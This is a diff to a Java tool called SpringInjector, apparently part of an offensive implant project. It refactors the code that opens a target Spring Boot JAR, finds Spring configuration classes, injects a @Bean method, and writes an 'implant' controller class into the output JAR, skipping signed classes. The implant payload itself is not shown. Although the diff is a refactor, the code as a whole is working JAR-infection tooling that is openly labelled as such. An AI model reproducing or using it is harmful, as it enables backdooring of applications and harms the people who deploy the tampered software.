@@ -5,13 +5,12 @@ import javassist.bytecode.annotation.Annotation;
 import org.example.implants.SpringImplantConfiguration;
 import org.example.implants.SpringImplantController;
 
-import java.io.*;
+import java.io.DataInputStream;
+import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.*;
 import java.util.jar.JarEntry;
-import java.util.jar.JarFile;
-import java.util.jar.JarOutputStream;
 
 public class SpringInjector {
     public static void main(String[] args) {
@@ -23,6 +22,8 @@ public class SpringInjector {
         try {
             Path targetPath = Path.of(args[0]);
             Path outputPath = Path.of(args[1]);
+            System.out.println("[i] Target JAR: " + targetPath);
+            System.out.println("[i] Output JAR: " + outputPath);
             if (!Files.exists(targetPath) && !Files.isRegularFile(targetPath)) {
                 System.out.println("[!] Target JAR is not a regular existing file.");
                 System.exit(1);
@@ -45,46 +46,31 @@ public class SpringInjector {
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
-        // TODO Consider that some JARs may be multi-versioned
-        try (JarFile targetJar = new JarFile(targetJarFilePath.toFile())) {
-            return infect(targetJar, outputJar);
-        }
-    }
-
-    public boolean infect(final JarFile targetJar, Path outputJar) throws IOException {
-        // TODO This code is shit. Refactoring needed.
         boolean didInfect = false;
-        try (JarOutputStream jarOutputStream = new JarOutputStream(new FileOutputStream(outputJar.toFile()))) {
-            boolean foundSignedClasses = false;
-            Enumeration<JarEntry> entries = targetJar.entries();
-            while (entries.hasMoreElements()) {
-                JarEntry entry = entries.nextElement();
-
+        boolean foundSignedClasses = false;
+        try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
+            for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                 if (!entry.getName().endsWith(".class")) {
-                    passEntry(targetJar, jarOutputStream, entry);
+                    entry.passOn();
                     continue;
                 }
-                if (entry.getCodeSigners() != null) {
+                if (entry.getEntry().getCodeSigners() != null) {
                     foundSignedClasses = true;
-                    passEntry(targetJar, jarOutputStream, entry);
+                    entry.passOn();
                     continue;
                 }
 
                 ClassFile classFile;
-                try (DataInputStream in = new DataInputStream(targetJar.getInputStream(entry))) {
+                try (DataInputStream in = new DataInputStream(entry.getContent())) {
                     classFile = new ClassFile(in);
                     if (!isSpringContext(classFile)) {
-                        passEntry(targetJar, jarOutputStream, entry);
+                        entry.passOn();
                         continue;
                     }
                     System.out.println("[+] Found Spring configuration: " + entry.getName());
 
                     if (!hasComponentScanEnabled(classFile)) {
-                        // TODO Explicitly add a @Bean to the configuration
-                        // Maybe it doesn't hurt to add it despite @ContentScan being enabled?
-
                         System.out.println("[-] Spring configuration is not set to scan for components (@ComponentScan).");
-
                         try {
                             ClassFile implantSpringConfig = ImplantReader.findAndReadClassFile(SpringImplantConfiguration.class);
                             if (!addSpringBean(classFile, implantSpringConfig)) {
@@ -94,10 +80,10 @@ public class SpringInjector {
                             throw new RuntimeException(e);
                         }
 
-                        newEntry(classFile, jarOutputStream, entry);
+                        classFile.write(entry.addOnly());
                         System.out.println("[+] Injected @Bean method into '" + classFile.getName() + "'.");
                     } else {
-                        passEntry(targetJar, jarOutputStream, entry);
+                        entry.passOn();
                     }
 
                     // Just add a new class into the JAR
@@ -108,12 +94,11 @@ public class SpringInjector {
                     implantClass.setName(targetPackageName + "." + implantClassName);
                     String fullPathInsideJar = "BOOT-INF/classes/" + implantClass.getName().replace(".", "/") + ".class";
                     JarEntry newJarEntry = new JarEntry(fullPathInsideJar);
-                    newEntry(implantClass, jarOutputStream, newJarEntry);
+                    implantClass.write(fiddler.addNewEntry(newJarEntry));
                     System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
                     didInfect = true;
                 }
             }
-            jarOutputStream.close();
 
             if (foundSignedClasses) {
                 System.out.println("[-] Found signed classes. These were not considered for infection.");
@@ -187,19 +172,6 @@ public class SpringInjector {
         }
 
         return true;
-    }
-
-    private static void passEntry(final JarFile sourceJar, final JarOutputStream out, final JarEntry entry) throws IOException {
-        out.putNextEntry(entry);
-        BufferedInputStream in = new BufferedInputStream(sourceJar.getInputStream(entry));
-        out.write(in.readAllBytes());   // Don't bother with optimization for now
-        out.closeEntry();
-    }
-
-    private static void newEntry(final ClassFile modified, final JarOutputStream out, final JarEntry newEntry) throws IOException {
-        out.putNextEntry(newEntry);
-        modified.write(new DataOutputStream(out));
-        out.closeEntry();
     }
 
     private static boolean isSpringContext(final ClassFile classFile) {
